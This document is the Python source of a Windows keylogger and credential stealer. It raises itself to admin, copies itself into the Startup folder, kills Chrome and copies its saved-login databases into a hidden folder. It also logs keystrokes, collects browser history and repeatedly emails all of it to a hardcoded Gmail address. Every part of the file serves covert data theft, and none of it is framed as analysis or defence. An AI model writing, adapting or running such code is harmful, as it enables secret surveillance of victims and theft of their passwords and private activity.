import ctypes
import os
import shutil
import smtplib
import sys
import time
import subprocess
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from browser_history import get_history
from pynput import keyboard

def is_admin():
    """Check if the script is running with admin privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """Relaunch the script with admin privileges."""
    if not is_admin():
        print("Attempting to relaunch as admin...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

def find_exe():
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    exe_file_path = os.path.join(startup_folder, "Alice.exe")
    return os.path.isfile(exe_file_path)

def add_to_startup_windows():
    script_path = os.path.abspath(sys.argv[0])
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    try:
        shutil.copy(script_path, startup_folder)
    except PermissionError:
        print("Permission denied. Attempting to run as admin...")
        run_as_admin()

def send_email(subject, body, to_email, attachment_paths, smtp_server, smtp_port, sender_email):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    for attachment_path in attachment_paths:
        if attachment_path:
            try:
                with open(attachment_path, "rb") as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(attachment_path)}"')
                    msg.attach(part)
            except Exception as e:
                print(f"Failed to attach file {attachment_path}: {e}")

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(sender_email, "")  # Use a proper password here
            server.sendmail(sender_email, to_email, msg.as_string())
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

def key_pressed(key):
    """Logs the pressed key to a file."""
    try:
        with open("keyfile.txt", 'a') as logKey:
            # Check if the key has the 'char' attribute
            if hasattr(key, 'char') and key.char is not None:  # Check for character keys
                logKey.write(key.char)
            else:  # If the key is a special key
                if key == keyboard.Key.backspace:
                    logKey.write("[BACKSPACE]")
                elif key == keyboard.Key.space:
                    logKey.write(" ")
                elif key == keyboard.Key.enter:
                    logKey.write("\n")  # Log Enter key as newline
                else:
                    logKey.write(f"[{key.name}]")  # Log other special keys
    except Exception as e:
        print(f"Error logging key: {e}")


def close_chrome():
    """Close the Chrome browser if it's running."""
    try:
        subprocess.run(["taskkill", "/F", "/IM", "chrome.exe"], check=True)
        print("Chrome has been closed.")
    except subprocess.CalledProcessError:
        print("Chrome was not running or could not be closed.")

def copy_chrome_login_data(destination):
    """Copy Chrome's Login Data and Login Data for Account files to the specified destination."""
    user = os.getlogin()  # Get the current user

    # Define source paths for both Login Data files
    login_data_path = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
    login_data_account_path = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data for Account"
    
    # Ensure the destination directory exists
    os.makedirs(destination, exist_ok=True)

    # Define destination paths for the copied Login Data files
    login_data_destination_path = os.path.join(destination, "Login_Data")
    login_data_account_destination_path = os.path.join(destination, "Login_Data_for_Account")

    # List to keep track of copied files
    copied_files = []

    try:
        # Copy the Login Data file
        shutil.copy2(login_data_path, login_data_destination_path)
        print(f"Copied 'Login Data' to {login_data_destination_path}")
        copied_files.append(login_data_destination_path)

        # Copy the Login Data for Account file
        shutil.copy2(login_data_account_path, login_data_account_destination_path)
        print(f"Copied 'Login Data for Account' to {login_data_account_destination_path}")
        copied_files.append(login_data_account_destination_path)

        return copied_files  # Return the list of copied file paths
    except FileNotFoundError as e:
        print(f"File not found: {e}")
        return []
    except PermissionError:
        print("Permission denied. Ensure the script is run with appropriate permissions.")
        return []
    except Exception as e:
        print(f"An error occurred: {e}")
        return []

def main():
    run_as_admin()  # Ensure the script is running with admin privileges

    # Define a hidden directory to store files
    hidden_dir = os.path.join(os.getenv("APPDATA"), "MyHiddenFolder")
    if not os.path.exists(hidden_dir):
        os.makedirs(hidden_dir)
        # Set the folder to hidden
        subprocess.run(['attrib', '+h', hidden_dir])

    log_file_path = os.path.join(os.getcwd(), "keyfile.txt")
    subject = "Keys"
    body = "Hello, this is a test email from tutanota.com"
    to_email = "seanlatrigne@gmail.com"
    smtp_server = "smtp.gmail.com"  # Corrected for Gmail
    smtp_port = 587
    sender_email = "seanlatrigne@gmail.com"

    exe_exists = find_exe()
    if not exe_exists:
        add_to_startup_windows()

    # Close Chrome before copying Login Data
    close_chrome()

    # Copy both Login Data files
    login_data_attachment_paths = copy_chrome_login_data(hidden_dir)  # Copy to hidden directory

    # Start the key listener
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()

    # Let the key listener run for a specified time or indefinitely
    time.sleep(120)  # Adjust the duration as necessary

    while True:
        # Save browser history to a JSON file
        outputs = get_history()
        history_file_path = os.path.join(hidden_dir, "history.json")
        outputs.save(history_file_path)  # Save history to hidden directory

        # Delay between sending emails
        time.sleep(20)

        # Prepare attachment paths for the email
        attachment_paths = [log_file_path] + login_data_attachment_paths

        # Include the history.json file in the attachments
        if os.path.exists(history_file_path):
            attachment_paths.append(history_file_path)

        # Send the email with the collected key logs and history
        send_email(subject, body, to_email, attachment_paths, smtp_server, smtp_port, sender_email)

if __name__ == "__main__":
    main()
